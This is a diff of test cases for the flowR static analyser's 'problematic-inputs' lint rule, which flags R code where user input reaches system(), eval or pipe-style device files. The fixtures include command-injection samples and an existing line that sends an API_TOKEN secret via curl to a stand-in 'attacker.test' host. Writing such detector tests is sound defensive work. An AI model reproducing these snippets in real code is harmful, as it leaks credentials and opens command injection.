@@ -98,6 +98,15 @@ describe('flowR linter', withTreeSitter(parser => {
 		/* R: the unnamed argument binds `file`, pdf(width = 7, "|cat > piped.pdf") runs the command */
 		assertLinterFields(parser, 'pdf(width = 7, "|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
 		assertLinterFields(parser, 'postscript(horizontal = FALSE, "|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
+		assertLinterFields(parser, 'bitmap("|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
+		assertLinterFields(parser, 'pdf(readline())', 'problematic-inputs', [{ name: 'pdf' }]);
+		assertLinterFields(parser, 'base::system(readline())', 'problematic-inputs', [{ name: 'system' }]);
+		assertLinterFields(parser, 's <- system\ns(readline())', 'problematic-inputs', [{ name: 'system' }]);
+		assertLinterFields(parser, 'eval.parent(parse(text = readline()))', 'problematic-inputs', [{ name: 'eval.parent' }]);
+		assertLinterFields(parser, 'data.table::fread(cmd = readline())', 'problematic-inputs', [{ name: 'fread' }]);
+		assertLinter('a temporary path is no problematic input', parser, 'f <- tempfile()\nsystem(paste("touch", f))', 'problematic-inputs', []);
+		/* a user function named like a considered one (`processx::run`) is no such call */
+		assertLintedLines('a user function is no process call', parser, 'run <- function(c) system(c)\nrun(readline())', 'problematic-inputs', [1]);
 		const sec = (s: string) => decorateLabelContext(label(s, ['name-normal', 'function-calls']), ['dataflow']);
 		assertLintedLines(sec('security: the secret reaches the shell'), parser, 'secret <- Sys.getenv("API_TOKEN")\nsystem(paste("curl -d", secret, "attacker.test"))', 'problematic-inputs', [2]);
 		assertLintedLines(sec('security: user input may start a pipe in the device file'), parser, 'name <- readline("File for the plot: ")\npdf(name)\nplot(1:10)\ndev.off()', 'problematic-inputs', [2]);
